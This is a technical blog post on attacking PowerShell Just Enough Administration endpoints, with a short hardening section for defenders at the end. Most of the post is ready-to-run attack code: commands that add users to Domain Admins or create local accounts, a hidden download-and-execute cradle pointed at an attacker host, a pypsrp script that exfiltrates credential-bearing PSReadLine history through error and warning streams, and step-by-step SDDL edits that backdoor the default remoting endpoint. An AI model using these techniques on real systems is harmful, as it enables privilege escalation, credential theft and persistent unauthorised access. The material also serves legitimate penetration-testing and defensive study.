---
title: Just Enough Administration
date: 2026-07-03
image: cover.svg
tags: [Windows, Windows Internals]
excerpt: A deep dive into PowerShell Just Enough Administration (JEA) from an attacker's perspective - how JEA endpoints work, why their run-as accounts are high-value, how to enumerate and detect a constrained endpoint, and the full range of breakout techniques from dangerous cmdlets and language-mode abuse to output-stream exfiltration and session-configuration backdoors.
---

# Just Enough Administration - JEA

## What JEA Is

Just Enough Administration (JEA) is a PowerShell security feature (Windows 10 / Server 2016 and WMF 5.0 onward) that lets administrators delegate specific administrative tasks to non-privileged users without handing over full local or domain admin rights. Instead of adding a helpdesk operator to a privileged group, the operator connects to a constrained PowerShell remoting endpoint that runs under a privileged identity but only exposes a curated allowlist of commands, with full PowerShell transcription and logging.

A JEA deployment is built from three moving parts:

- **Session configuration file (`.pssc`)** - registered as a WinRM/PSSession endpoint. It defines the `SessionType`, the run-as identity (virtual account or gMSA), transcript directory, and the `RoleDefinitions` that map AD groups or users to role capabilities.
- **Role capability file (`.psrc`)** - the actual allowlist. It defines `VisibleCmdlets`, `VisibleFunctions`, `VisibleExternalCommands`, `VisibleProviders`, `VisibleAliases`, `FunctionDefinitions`, `ScriptsToProcess`, and `ModulesToImport`, including per-parameter restrictions.
- **A run-as account** - either a temporary **virtual account** (a local administrator, and on a domain controller a member of Domain Admins) or a **group Managed Service Account (gMSA)**.

When a user connects, PowerShell spins up a constrained runspace: the language mode is locked down, only the allowlisted commands are visible, and everything the user runs executes under the privileged run-as identity rather than their own.

### Language modes

Language mode is the single most important control on a JEA endpoint:

- **NoLanguage** - the default for `SessionType = 'RestrictedRemoteServer'`. Only allowlisted commands run; variables, operators, loops, and script blocks are blocked. This is the hardened baseline.
- **ConstrainedLanguage** - core language elements work but .NET types and COM are restricted. Misconfigured endpoints that set this instead of NoLanguage are far easier to break out of, because you can define your own functions and manipulate variables.
- **FullLanguage** - no restriction. If a JEA endpoint ends up here, it is effectively unconstrained remoting.

Check the current mode from inside a session:

```powershell
$ExecutionContext.SessionState.LanguageMode
```

## Why JEA Matters to Attackers

JEA is interesting for two reasons, both stemming from the privileged run-as account:

- **Privilege escalation** - a virtual account is a **local administrator** on the target. On a **domain controller**, the virtual account is a member of **Domain Admins** by default (unless `RunAsVirtualAccountGroups` was set to restrict it). Any breakout therefore escalates from a low-privileged user to local admin, or to domain admin on a DC. If the endpoint runs as a **gMSA**, a breakout inherits that gMSA's rights across the domain.
- **Persistence** - the session configuration itself is a durable, often-overlooked backdoor surface. Adding your SID to an endpoint's SDDL, or backdooring the default `Microsoft.PowerShell` endpoint, survives reboots and blends into legitimate administration.

The whole game is: find a gap in the allowlist that lets you run arbitrary code in the run-as context, or modify the configuration to grant yourself access.

## Connecting to a JEA Endpoint

Use `DOMAIN\USER` format for credentials and always specify the `ConfigurationName`, since the endpoint name is what distinguishes a JEA endpoint from the default remoting endpoint.

```powershell
$creds = Get-Credential
$sess  = New-PSSession -ComputerName <FQDN> -ConfigurationName <JEA_ENDPOINT_NAME> -Credential $creds
Enter-PSSession $sess
```

From Linux, `pypsrp` and `evil-winrm` can also target a specific configuration name (see the stream-exfiltration section below for a `pypsrp` example).

## Enumeration and Detection

### Enumerating endpoints and capabilities

List the registered session configurations on a host. Non-default names (anything that is not `Microsoft.PowerShell*`, `Microsoft.WSMan*`) are candidate JEA endpoints:

```powershell
Get-PSSessionConfiguration
(Get-PSSessionConfiguration).Name
```

Show exactly which commands a given user is allowed to run through an endpoint, without even connecting. This is the fastest way to spot a dangerous allowlist:

```powershell
Get-PSSessionCapability -ConfigurationName <NAME> -Username <DOMAIN>\<USERNAME>
```

Reading the endpoint's ACL reveals who is permitted to connect (useful for both targeting and persistence detection):

```powershell
(Get-PSSessionConfiguration -Name <NAME>).SecurityDescriptorSDDL
Get-PSSessionConfiguration -Name <NAME> | Select-Object -ExpandProperty Permission
```

### Detecting that you are inside a JEA session

Signs that a remoting session is JEA-constrained rather than a full shell:

- `evil-winrm` or `Enter-PSSession` connects, but most cmdlets are missing or blocked.
- The configuration name is not `Microsoft.PowerShell`.
- Language mode is `NoLanguage` or `ConstrainedLanguage`.

Confirm from inside:

```powershell
# What can I actually run?
Get-Command

# Language restriction
$ExecutionContext.SessionState.LanguageMode

# Who am I running as? A virtual account looks like "WinRM Virtual Users\WinRM VA_..."
whoami
[System.Security.Principal.WindowsIdentity]::GetCurrent().Name

# Details about the constrained endpoint and run-as user
$PSSenderInfo
$PSSenderInfo.RunAsUser
$PSSenderInfo.ConnectionString
```

### Reading exposed function source

When `Get-Command` shows functions rather than cmdlets, dump their definitions. Custom role functions frequently hardcode credentials, call dangerous binaries, or contain parameter-handling bugs:

```powershell
Get-Command -CommandType Function | ForEach-Object { $_.Name; $_.Definition }
```

## Breaking Out - Abusing Misconfigurations

A JEA endpoint is only as strong as its allowlist. Most breakouts come from a command that was exposed without thinking through what it can do in a privileged context. After connecting, always start with:

```powershell
Get-Command
```

Then reason about each visible command. Below are the recurring gadget classes.

### Dangerous visible cmdlets and functions

Any of these being visible is usually game over, because each provides a path to arbitrary code, file writes, service abuse, or group membership changes:

| Command | Why it is dangerous |
| --- | --- |
| `Start-Process` | Launch any binary (`cmd.exe`, `powershell.exe`) in the run-as context |
| `Invoke-Command` | Run an arbitrary script block |
| `Invoke-Expression` / `iex` | Execute an arbitrary string as code |
| `Invoke-Item` | Open/execute an arbitrary file via its handler |
| `New-Service` / `Set-Service` / `Start-Service` | Create or repoint a service binary to run as SYSTEM |
| `Invoke-WmiMethod` / `Invoke-CimMethod` | Create processes (`Win32_Process.Create`) or manipulate the system |
| `New-ScheduledTask` / `Register-ScheduledTask` / `Register-ScheduledJob` | Schedule arbitrary commands |
| `Add-LocalGroupMember` / `Add-ADGroupMember` | Add yourself to Administrators / Domain Admins |
| `Out-File` / `Set-Content` / `Add-Content` / `New-Item` / `Copy-Item` | Plant a malicious module, script, or DLL to a writable, auto-loaded path |
| `Set-PSSessionConfiguration` / `Register-PSSessionConfiguration` | Modify or create endpoints (persistence and escalation) |
| `New-Object` (with COM/.NET) | Instantiate `WScript.Shell` and similar to shell out |

Direct examples:

```powershell
# Launch a shell
Start-Process cmd.exe
Start-Process powershell.exe

# Add yourself to local administrators
Invoke-Command -ScriptBlock { net localgroup administrators <USER> /add }

# Escalate on a domain controller (virtual account is Domain Admin)
Add-ADGroupMember -Identity "Domain Admins" -Members <USER>

# Process creation via WMI/CIM
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = "cmd.exe /c net user hacker P@ss123! /add" }
```

Do not stop at the obvious names. Enumerate every visible command and search for known abuse primitives, for example the TripleSec JEA breakout research: [triplesec.info JEA slides](https://www.triplesec.info/slides/3c567aac7cf04f8646bf126423393434.pdf).

### Wildcards in the allowlist

If a role capability uses wildcards, it often exposes far more than intended. `VisibleCmdlets = 'Microsoft.PowerShell.Management\*'` exposes the entire management module, and `VisibleCmdlets = '*'` exposes everything, defeating the point of JEA. Enumerate and hunt for anything that shells out.

### Constrained Language Mode - defining your own functions

If the endpoint runs in **ConstrainedLanguage** rather than **NoLanguage**, you can define functions and chain commands. This turns a small allowlist into a launchpad, because a defined function can wrap whatever visible primitives exist:

```powershell
# Define and immediately invoke a function
function gl { Get-Location }; gl

function gl { whoami }; gl

# Stage a download-cradle if a scripting path is reachable
function gl { powershell.exe -nop -w hidden -c "IEX ((New-Object Net.WebClient).DownloadString('http://<IP>/shell.ps1'))" }; gl
```

The shorthand `& { <COMMAND> }` executes a script block inline where language mode permits it.

### Visible external commands (LOLBins)

`VisibleExternalCommands` exposes native executables rather than cmdlets. Anything dangerous here is a direct win. Watch for `net.exe`, `cmd.exe`, `dsadd.exe`, `whoami.exe`, `reg.exe`, `sc.exe`, or any script interpreter. To grant admin quickly:

```
Add-ADGroupMember   Add-LocalGroupMember   net.exe   dsadd.exe
```

### Running arbitrary code through indirect cmdlets

Even without an obvious shell cmdlet, several primitives lead to execution:

```
Start-Process   New-Service   Invoke-Item   Invoke-WmiMethod   Invoke-Command
New-ScheduledTask   Register-ScheduledJob
```

### Parameter and argument injection

A cmdlet exposed without parameter restrictions is often abusable through its parameters. If the role capability does not pin parameters with `ValidateSet` / `ValidatePattern`, look for parameters that take a path, a script block, or a command string. For example, a visible `Start-Transcript` can write to an arbitrary location, and many management cmdlets accept a `-ComputerName` that enables lateral movement in the run-as context. Well-designed roles restrict parameters like this:

```powershell
VisibleCmdlets = @{
    Name       = 'Restart-Service'
    Parameters = @{ Name = 'Name'; ValidateSet = 'Spooler' }
}
```

If you do not see those restrictions, the parameter is fair game.

### Provider access - filesystem and registry

`VisibleProviders` controls which PowerShell providers (FileSystem, Registry, etc.) are reachable. With FileSystem plus any write cmdlet, you can plant a malicious module into a path listed in `$env:PSModulePath`, or drop a script into `ScriptsToProcess`, so that privileged code loads it on the next session. With Registry access you can read or set autoruns and service configuration.

### File-write to code-execution chains

If any write primitive (`Set-Content`, `Add-Content`, `Out-File`, `New-Item`, `Copy-Item`) is exposed, convert the write into execution:

- Write a `.psm1` module into a `%PSModulePath%` directory and trigger auto-loading.
- Overwrite or create a script referenced by the endpoint's `ScriptsToProcess`, which runs privileged on the next connect.
- Drop a DLL next to a service or application vulnerable to search-order hijacking.
- Create a scheduled task XML in a watched location.

## Data Exfiltration via Output Streams

Most JEA configurations only filter the **success (output) stream**. The error, warning, verbose, debug, information, and object streams are frequently left unfiltered, so data can be smuggled out even when normal output is blocked. The highest-value target is PSReadLine command history, which regularly contains plaintext credentials typed by other administrators.

The idea: read the sensitive data, then push it through a stream that is not filtered - throw it as an exception, emit it as a warning, or wrap it in an object.

### The credential goldmine: PSReadLine history

```powershell
# History file - commands typed by every admin who used this host, sometimes with plaintext creds
$HIST = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
Get-Content $HIST

# Typical finds:
# $cred = New-Object PSCredential("user", (ConvertTo-SecureString "pass" -AsPlainText -Force))
# Enter-PSSession -ComputerName X -Credential $cred
```

### Detecting and connecting for the stream test

```powershell
# Check available endpoints - a non-default name like 'restricted' suggests JEA
(Get-PSSessionConfiguration).Name

# Connect to the JEA endpoint
$cred = New-Object System.Management.Automation.PSCredential("domain\user", (ConvertTo-SecureString "pass" -AsPlainText -Force))
Enter-PSSession -ComputerName dc1.domain.local `
  -ConfigurationName restricted `
  -Credential $cred

# Check what is available
Get-Command
```

### Stream-leak bypass with pypsrp

This script reads a target file inside the constrained endpoint and exfiltrates it through three different streams, so at least one is likely to slip past the success-stream filter:

```python
from pypsrp.powershell import PowerShell, RunspacePool
from pypsrp.wsman import WSMan

wsman = WSMan('dc1.domain.local', auth='kerberos', ssl=False,
              negotiate_service='HTTP')
HIST = "C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt"

with RunspacePool(wsman, configuration_name='restricted') as pool:
    # Method 1: throw as exception (error stream)
    ps = PowerShell(pool)
    ps.add_script('&{ $c = Get-Content "' + HIST + '" -Raw; throw $c }')
    ps.invoke()
    for e in ps.streams.error:
        print(str(e))

    # Method 2: Write-Warning (warning stream - often bypasses the filter)
    ps = PowerShell(pool)
    ps.add_script('&{ $c = Get-Content "' + HIST + '" -Raw; Write-Warning $c }')
    ps.invoke()
    for w in ps.streams.warning:
        print(str(w))

    # Method 3: PSCustomObject (object stream)
    ps = PowerShell(pool)
    ps.add_script('&{ Get-Content "' + HIST + '" | ForEach-Object { [PSCustomObject]@{Name=$_} } }')
    output = ps.invoke()
    for o in output:
        print(o)
```

The same technique applies to any readable secret: unattended files, config files, or the registry, as long as one output stream is unfiltered.

## Persistence and Escalation via Session Configuration

If you can modify session configurations, you can grant yourself access to a privileged endpoint or backdoor the default remoting endpoint. The classic tooling is [RACE.ps1](https://github.com/samratashok/RACE/blob/master/RACE.ps1), which edits the endpoint's SDDL to add a chosen SID with full access. Crucially, this can target `microsoft.powershell` (the normal remoting endpoint), turning ordinary WinRM into a backdoor for a non-admin user.

### 1. Connect and review the current configuration

```powershell
$sess = New-PSSession -ComputerName <FQDN> -Credential $creds -ConfigurationName <ENDPOINT>
Enter-PSSession $sess
Get-PSSessionConfiguration
```

### 2. Capture the existing SDDL

```powershell
$existingSDDL = (Get-PSSessionConfiguration -Name "<PROFILE>" -Verbose:$false).SecurityDescriptorSDDL
```

### 3. Resolve the SID of the user to add

```powershell
$SID = (Get-DomainUser <USER>).ObjectSid
```

### 4. Build a new SDDL granting that SID access

The access mask `268435456` is `0x10000000` (GENERIC_ALL), which grants full access to the endpoint:

```powershell
$isContainer = $false
$isDS        = $false
$SecurityDescriptor = New-Object -TypeName Security.AccessControl.CommonSecurityDescriptor -ArgumentList $isContainer, $isDS, $existingSDDL
$accessType       = "Allow"
$accessMask       = 268435456
$inheritanceFlags = "none"
$propagationFlags = "none"
$SecurityDescriptor.DiscretionaryAcl.AddAccess($accessType, $SID, $accessMask, $inheritanceFlags, $propagationFlags) | Out-Null
$newSDDL = $SecurityDescriptor.GetSddlForm("All")
$newSDDL
```

### 5. Apply the new SDDL

```powershell
Set-PSSessionConfiguration -Name "<PROFILE>" -SecurityDescriptorSddl "<SDDL>" -Force -Confirm:$false
```

### 6. Reconnect and verify

```powershell
$sess2 = New-PSSession -ComputerName <FQDN> -Credential $creds2 -ConfigurationName <RECONFIGURED_ENDPOINT>
Enter-PSSession $sess2
Get-PSSessionConfiguration
```

The chosen user can now connect to the (privileged) endpoint without being in any privileged group. After finding a profile to edit, remember that `microsoft.powershell` (the normal remoting endpoint) can be edited the same way for a stealthier backdoor.

## Building a JEA Endpoint

Understanding how an endpoint is registered makes it much easier to spot weaknesses and to build a malicious endpoint for persistence. The walkthrough below registers a minimal `Spooler_Admins` endpoint.

### 1. Create the session configuration file

```powershell
New-PSSessionConfigurationFile -Path 'C:\Program Files\WindowsPowerShell\spooler_conf.pssc'
notepad 'C:\Program Files\WindowsPowerShell\spooler_conf.pssc'
```

A cleaned-up `.pssc` looks like this. The `SessionType` is set to `RestrictedRemoteServer` and the `RoleDefinitions` map a user to a role and its visible cmdlets:

```powershell
@{
    # Version number of the schema used for this document
    SchemaVersion = '2.0.0.0'

    # ID used to uniquely identify this document
    GUID = '8c1e7490-3f03-450e-b97b-c4554e879535'

    # Author of this document
    Author = 'fcastle'

    # Session type. 'RestrictedRemoteServer' (recommended), 'Empty', or 'Default'
    SessionType = 'RestrictedRemoteServer'

    # Directory to place session transcripts
    TranscriptDirectory = 'C:\Transcripts\'

    # Run this configuration as the machine's virtual (admin) account
    # RunAsVirtualAccount = $true

    # Security groups / users, and the role capabilities applied to them
    RoleDefinitions = @{
        'horus-dc\fcastle' = @{ VisibleCmdlets = 'Get-Process' }
    }
}
```

### 2. Create the role capability

Role capability files must live inside a `RoleCapabilities` folder within a module on `$env:PSModulePath`:

```powershell
New-Item -Path 'C:\Program Files\WindowsPowerShell\Modules\JEA\RoleCapabilities' -ItemType Directory
New-PSRoleCapabilityFile -Path 'C:\Program Files\WindowsPowerShell\Modules\JEA\RoleCapabilities\spooler_admins.psrc'
notepad 'C:\Program Files\WindowsPowerShell\Modules\JEA\RoleCapabilities\spooler_admins.psrc'
```

A minimal `.psrc` with a single visible cmdlet:

```powershell
@{
    # ID used to uniquely identify this document
    GUID = 'a6e0b3a5-4106-4cf2-a951-a8337fcd4a92'

    # Author of this document
    Author = 'fcastle'

    # Company associated with this document
    CompanyName = 'Unknown'

    # Copyright statement for this document
    Copyright = '(c) 2020 fcastle. All rights reserved.'

    # Cmdlets to make visible when applied to a session
    VisibleCmdlets = 'Get-Process'
}
```

To expose a native command such as `whoami` or `net`, add it under `VisibleExternalCommands` rather than `VisibleCmdlets`, since those are executables and not cmdlets.

### 3. Register and test

```powershell
# Ensure WinRM is configured
winrm quickconfig

# Register the endpoint
Register-PSSessionConfiguration -Name Spooler_Admins -Path 'C:\Program Files\WindowsPowerShell\spooler_conf.pssc'

# Apply it
Restart-Service WinRM

# Connect
Enter-PSSession -ComputerName COMP1 -ConfigurationName Spooler_Admins
```

Inside the session, the only visible cmdlet is `Get-Process`; the rest of what `Get-Command` shows are proxy functions the runspace provides.

## Breaking Out of JEA - Method

Because the JEA session runs with elevated privileges, a successful breakout inherits them. Breakouts depend entirely on which commands are available, and the surface is too large to cover exhaustively, so the workflow is enumerate then reason.

Enumerate everything available in the session:

```powershell
Get-Command
```

Prioritise these command names when you see them, as each is a known breakout primitive:

```
Set-PSSessionConfiguration   Start-Process   New-Service   Add-Computer
Invoke-Command   Invoke-Expression   Invoke-WmiMethod   Invoke-CimMethod
Register-ScheduledTask   Add-LocalGroupMember   Add-ADGroupMember
Out-File   Set-Content   New-Item
```

Then cross-reference the visible commands, their unrestricted parameters, and the current language mode against the abuse techniques above.

## Detection and Hardening (Defenders)

- Prefer `SessionType = 'RestrictedRemoteServer'` so the endpoint runs in **NoLanguage** mode. Never expose a JEA endpoint in FullLanguage.
- Never use wildcards in `VisibleCmdlets` / `VisibleFunctions`. Allowlist explicit commands only.
- Pin parameters with `ValidateSet` / `ValidatePattern` so a permitted cmdlet cannot be turned against you.
- Avoid exposing execution primitives (`Start-Process`, `Invoke-*`, `New-Service`, scheduled-task cmdlets, group-membership cmdlets, and raw file-write cmdlets) unless absolutely required, and constrain them heavily if so.
- Restrict the virtual account on domain controllers with `RunAsVirtualAccountGroups` so it is not implicitly Domain Admin, or use a least-privileged gMSA.
- Enable `TranscriptDirectory` (over-the-shoulder transcription), PowerShell Script Block Logging, Module Logging, and Protected Event Logging so breakout attempts and stream-based exfiltration are recorded.
- Audit endpoint SDDLs regularly for unexpected SIDs, especially on `Microsoft.PowerShell`, to catch RACE-style persistence.
- Treat PSReadLine history as sensitive; disable history capture for privileged accounts or clear it, since it is a prime stream-exfiltration target.

## References

- Microsoft - [Just Enough Administration documentation](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/overview)
- TripleSec - [JEA breakout research (slides)](https://www.triplesec.info/slides/3c567aac7cf04f8646bf126423393434.pdf)
- Nikhil Mittal - [RACE.ps1](https://github.com/samratashok/RACE/blob/master/RACE.ps1) (session configuration SDDL abuse)
- AD Attack Playbook - [JEA (Just Enough Administration) bypass](https://sowatkheang.github.io/ad_attack_playbook/07-jea-just-enough-administration-bypass/)
